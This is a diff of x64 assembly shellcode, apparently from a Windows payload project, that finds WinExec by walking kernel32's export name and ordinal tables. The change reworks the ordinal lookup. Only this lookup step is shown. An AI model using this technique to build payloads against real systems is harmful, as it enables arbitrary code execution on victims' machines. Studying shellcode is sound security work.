@@ -44,13 +44,11 @@ SECTION .text
     ADD     RSI, RDI                      ; RSI = kernel32 + offset(names table) = &(names table)
 ; Found export names table (RSI)
     MOV     ECX, DWORD [RDI + RBX + 0x24] ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
-    ADD     RCX, RDI                      ; RCX = kernel32 + offset(ordinals table) = ordinals table
 ; Found export ordinals table (RCX)
-    CQO                                   ; RDX = 0 (RAX is a userland address, so sign bit = 0)
 find_winexec_x64:
 ; speculatively load ordinal (RBP)
-    MOVZX   EBP, WORD [RCX + RDX * 2]     ; RBP = [ordinals table + (WinExec function number + 1) * 2] = WinExec function ordinal (eventually)
-    INC     EDX                           ; RDX = function number + 1
+    MOVZX   EBP, WORD [RDI + RCX]         ; RBP = [kernel32 + offset(ordinals table) + offset] = function ordinal
+    LEA     ECX, [RCX + 2]                ; RCX = offset += 2
     LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
     CMP     DWORD [RDI + RAX], B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
     JNE     find_winexec_x64              ;
